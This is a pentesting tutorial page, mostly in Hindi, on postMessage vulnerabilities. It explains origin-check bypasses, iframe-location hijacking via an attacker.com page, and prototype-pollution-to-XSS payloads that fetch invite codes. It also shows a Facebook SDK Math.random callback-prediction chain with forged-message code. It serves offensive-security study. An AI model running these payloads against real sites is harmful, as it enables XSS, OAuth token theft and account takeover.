# PostMessage कमजोरियाँ

{{#include ../../banners/hacktricks-training.md}}

## **PostMessage** भेजना

**PostMessage** संदेश भेजने के लिए निम्नलिखित फ़ंक्शन का उपयोग करता है:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
ध्यान दें कि **targetOrigin** '\*' हो सकता है या एक URL जैसे _https://company.com._\
दूसरे परिदृश्य में, **message केवल उसी डोमेन पर ही भेजा जा सकता है** (भले ही Window object का origin अलग हो)।\
यदि **wildcard** का उपयोग किया गया है, तो **messages किसी भी डोमेन पर भेजे जा सकते हैं**, और वे Window object के origin पर भेजे जाएंगे।

### iframe और wildcard पर हमला — **targetOrigin** में

जैसा कि [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) में समझाया गया है, यदि आपको ऐसा पेज मिलता है जिसे **iframed** किया जा सकता है (कोई `X-Frame-Header` protection नहीं) और जो **sending sensitive** message को **postMessage** के जरिए **wildcard** (\*) का उपयोग करके भेज रहा है, तो आप **iframe** के **origin** को **modify** कर सकते हैं और उस **sensitive** message को अपने नियंत्रित डोमेन पर **leak** कर सकते हैं।\
ध्यान दें कि यदि पेज को iframed किया जा सकता है पर **targetOrigin** **set to a URL and not to a wildcard** है, तो यह **trick won't work**।
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** JS में उस function को declare करने के लिए उपयोग की जाने वाली function है जो **`postMessages`** की अपेक्षा कर रही है।\
निम्नलिखित जैसे code का उपयोग किया जाएगा:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **खोजें** JS कोड में `window.addEventListener` and `$(window).on` (_JQuery version_) के लिए
- **कंसोल में चलाएँ** developer tools console में: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **जाएँ** ब्राउज़र के developer tools में _Elements --> Event Listeners_

![](<../../images/image (396).png>)

- ऐसे **browser extension** का इस्तेमाल करें जैसे [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) या [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). ये browser extensions सभी messages को **intercept** कर के आपको दिखाएँगी।

### Origin check bypasses

- **`event.isTrusted`** attribute को सुरक्षित माना जाता है क्योंकि यह केवल वास्तविक user actions से उत्पन्न events के लिए `True` लौटाता है। अगर सही तरीके से लागू किया गया हो तो इसे बायपास करना कठिन होता है, फिर भी security checks में इसका महत्व बड़ा है।
- PostMessage events में origin validation के लिए **`indexOf()`** के उपयोग को बायपास किया जा सकता है। इस कमजोरी का उदाहरण है:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()` का **`search()`** method regular expressions के लिए बनाया गया है, strings के लिए नहीं। regexp के अलावा कुछ पास करने पर यह implicit रूप से regex में बदल जाता है, जिससे method संभावित रूप से insecure हो सकता है। क्योंकि regex में dot (.) एक wildcard की तरह काम करता है, specially crafted domains के जरिए validation बायपास किया जा सकता है। उदाहरण के लिए:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** function भी `search()` की तरह regex को प्रोसेस करता है। अगर regex सही तरीके से नहीं बनाया गया है तो यह बायपास के लिए प्रवण हो सकता है।
- **`escapeHtml`** function इनपुट्स को sanitize करने के लिए characters को escape करने का इरादा रखता है। हालाँकि, यह एक नया escaped object नहीं बनाता बल्कि मौजूदा object की properties को overwrite कर देता है। इस व्यवहार का दुरुपयोग किया जा सकता है। खासकर अगर किसी object को इस तरह manipulate किया जा सके कि उसके controlled property `hasOwnProperty` को नहीं पहचानता, तो `escapeHtml` अपेक्षित रूप से काम नहीं करेगा। नीचे के उदाहरणों में यह दिखाया गया है:

- अपेक्षित विफलता:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- escape को बायपास करना:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

इस कमजोरी के संदर्भ में, `File` object विशेष रूप से explotable है क्योंकि इसकी `name` property read-only होती है। यह property जब templates में इस्तेमाल होती है तो `escapeHtml` द्वारा sanitized नहीं होती, जिससे संभावित security risks उत्पन्न होते हैं।

- JavaScript में `document.domain` property को script द्वारा set किया जा सकता है ताकि domain छोटा किया जा सके, जिससे same-origin policy को उसी parent domain के भीतर अधिक relaxed तरीके से लागू किया जा सके।

### Origin-only trust + trusted relays

अगर कोई receiver केवल **`event.origin`** की जाँच करता है (उदाहरण के लिए, किसी भी `*.trusted.com` को trust करता है) तो अक्सर आप उस origin पर एक **"relay" page** ढूँढ़ सकते हैं जो attacker-controlled params को दिए गए `targetOrigin`/`targetWindow` के माध्यम से `postMessage` करके echo करता है। उदाहरण के तौर पर marketing/analytics gadgets जो query params लेते हैं और `{msg_type, access_token, ...}` को `opener`/`parent` को forward करते हैं। आप:

- **पीड़ित पेज को ऐसे popup/iframe में खोलें जिसमें `opener` मौजूद हो** ताकि उसके handlers register हो जाएँ (कई pixels/SDKs केवल तभी listeners attach करते हैं जब `window.opener` मौजूद हो)।
- **एक और attacker window को trusted origin पर relay endpoint पर navigate करें**, और उन message fields को भरें जिन्हें आप inject करना चाहते हैं (message type, tokens, nonces)।
- क्योंकि message अब **trusted origin से** आता है, origin-only validation पास हो जाती है और आप victim listener में privileged behaviors (state changes, API calls, DOM writes) trigger कर सकते हैं।

वाइल्ड में देखे गए abuso patterns:

- Analytics SDKs (उदा., pixel/fbevents-style) `FACEBOOK_IWL_BOOTSTRAP` जैसे messages consume करते हैं, फिर **message में दिए token का इस्तेमाल करके backend APIs call करते हैं** और request body में **`location.href` / `document.referrer`** शामिल करते हैं। अगर आप अपना token सप्लाई करते हैं, तो आप इन requests को token के request history/logs में पढ़ सकते हैं और victim पेज के URL/referrer में मौजूद OAuth codes/tokens को exfiltrate कर सकते हैं।
- कोई भी relay जो arbitrary fields को `postMessage` में reflect करता है, आपको privileged listeners द्वारा अपेक्षित message types को **spoof** करने देता है। कमजोर input validation के साथ मिलाकर यह Graph/REST calls, feature unlocks, या CSRF-जैसे flows तक पहुँचने का रास्ता खोलता है।

Hunting tips: ऐसे `postMessage` listeners की enumeration करें जो केवल `event.origin` की जाँच करते हैं, फिर **same-origin HTML/JS endpoints** खोजें जो URL params को `postMessage` के माध्यम से forward करते हों (marketing previews, login popups, OAuth error pages)। दोनों को `window.open()` + `postMessage` के साथ जोड़कर origin checks बायपास करें।

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
आप किसी संदेश के **`e.source`** को null बना सकते हैं एक ऐसा **iframe** बनाकर जो **भेजता है** **postMessage** और जिसे **तुरंत हटाया** जाता है।

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

इन हमलों को करने के लिए आदर्श रूप से आप **पीड़ित वेब पेज को** एक `iframe` के अंदर रख पाएँगे। लेकिन कुछ headers जैसे `X-Frame-Header` उस **व्यवहार** को **रोक** सकते हैं।\
ऐसे परिदृश्यों में आप अभी भी कम छिपा हुआ हमला इस्तेमाल कर सकते हैं। आप vulnerable web application के लिए एक नया टैब खोल सकते हैं और उसके साथ संवाद कर सकते हैं:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### मेन पेज को ब्लॉक करके चाइल्ड को भेजा गया संदेश चुराना

निम्नलिखित पेज में आप देख सकते हैं कि कैसे आप **संवेदनशील postmessage डेटा** जो एक **child iframe** को भेजा गया है, उसे डेटा भेजने से पहले **main** पेज को **ब्लॉक** करके चुरा सकते हैं और child में मौजूद **XSS** का दुरुपयोग कर के उसे प्राप्त होने से पहले **leak the data** करवा सकते हैं:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe स्थान बदलकर संदेश चुराना

यदि आप X-Frame-Header के बिना किसी webpage को iframe कर सकते हैं जो एक और iframe रखता है, तो आप **उस child iframe का location बदल** सकते हैं, इसलिए यदि वह एक **postmessage** प्राप्त कर रहा है जो **wildcard** का उपयोग करके भेजा गया है, तो एक हमलावर उस iframe का **origin** उस पेज पर **change** कर सकता है जिसे वह नियंत्रित करता है और संदेश **steal** कर सकता है:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage से Prototype Pollution और/या XSS

ऐसे परिदृश्यों में जहाँ `postMessage` के द्वारा भेजा गया डेटा JS द्वारा execute होता है, आप पेज को **iframe** कर सकते हैं और `postMessage` के माध्यम से exploit भेजकर **prototype pollution/XSS** का फायदा उठा सकते हैं।

कुछ **बहुत अच्छे तरीके से समझाए गए XSS जो `postMessage` के माध्यम से हैं** आप यहाँ पा सकते हैं: [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

एक `postMessage` को `iframe` पर भेजकर **Prototype Pollution और फिर XSS** का दुरुपयोग करने वाले exploit का उदाहरण:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
**अधिक जानकारी** के लिए:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### postMessage ब्रिज में **`Math.random()`** callback tokens की भविष्यवाणी

जब message validation `Math.random()` से जनरेट किए गए “shared secret” का उपयोग करता है (उदा., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) और वही helper plugin iframes को नाम भी देता है, तो आप PRNG outputs को recover करके trusted messages को forge कर सकते हैं:

- **Leak PRNG outputs via `window.name`:** SDK auto-names plugin iframes with `guid()`. यदि आप top frame को control करते हैं, victim page को iframe करें, फिर plugin iframe को अपने origin पर navigate करें (उदा., `window.frames[0].frames[0].location='https://attacker.com'`) और `window.frames[0].frames[0].name` पढ़कर raw `Math.random()` output प्राप्त करें।
- **Force more outputs without reloads:** कुछ SDKs एक reinit path expose करते हैं; FB SDK में, `{xfbml:1}` के साथ `init:post` फायर करने पर `XFBML.parse()` force होता है, plugin iframe destroy/recreate होता है, और नए names/callback IDs generate होते हैं। बार-बार reinit जितने भी PRNG outputs चाहिए उतने produce करता है (ध्यान दें कि callback/iframe IDs के लिए अतिरिक्त internal `Math.random()` calls होते हैं, इसलिए solvers को बीच के values को skip करना होगा)।
- **Trusted-origin delivery via parameter pollution:** यदि कोई first-party plugin endpoint unsanitized parameter को cross-window payload में reflect करता है (उदा., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), तो आप `&type=...&iconSVG=...` inject कर सकते हैं जबकि trusted `facebook.com` origin को preserve करते हैं।
- **Predict the next callback:** Leaked iframe names को फिर से floats `[0,1)` में convert करें और कई values (non-consecutive भी) को V8 `Math.random` predictor (उदा., Z3-based) में feed करें। स्थानीय रूप से अगला `guid()` generate करके expected callback token को forge करें।
- **Trigger the sink:** postMessage data को इस तरह craft करें कि bridge `xd.mpn.setupIconIframe` dispatch करे और `iconSVG` में HTML inject करे (उदा., URL-encoded `<img src=x onerror=...>`), जिससे hosting origin के अंदर DOM XSS हासिल होता है; वहां से same-origin iframes (OAuth dialogs, arbiters, आदि) पढ़े जा सकते हैं।
- **Framing quirks help:** यह chain framing मांगता है। कुछ mobile webviews में, `X-Frame-Options` कभी-कभी `frame-ancestors` मौजूद होने पर unsupported `ALLOW-FROM` पर degrade कर सकता है, और “compat” parameters permissive `frame-ancestors` को force कर सकते हैं, जिससे `window.name` side channel सक्षम हो जाता है।

#### न्यूनतम forged message उदाहरण
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## संदर्भ

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- अभ्यास के लिए: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
